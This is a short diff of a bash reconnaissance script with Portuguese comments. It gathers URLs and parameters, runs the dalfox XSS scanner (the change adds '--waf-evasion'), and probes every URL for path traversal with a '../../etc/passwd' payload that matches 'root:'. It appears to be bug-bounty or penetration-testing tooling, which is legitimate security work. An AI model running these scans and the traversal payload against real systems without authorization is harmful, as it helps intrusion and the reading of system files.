@@ -23,7 +23,7 @@ cat domains_$1 | gau --subs --threads 5 | tee allUrls.txt;
 #cat domains_$1 | grep -i "\.<>$" allUrls.txt | tee log.txt;
 
 grep "=" allUrls.txt | tee allParams.txt; # Encontrar parametros que recebem algo
-cat allParams.txt | dalfox file allParams.txt -o xssTest; # Encontrar parametros que refletem caracteres para xss
+cat allParams.txt | dalfox file allParams.txt --waf-evasion | tee xsstest; # Encontrar parametros que refletem caracteres e possiveis xss
 httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal
 
 
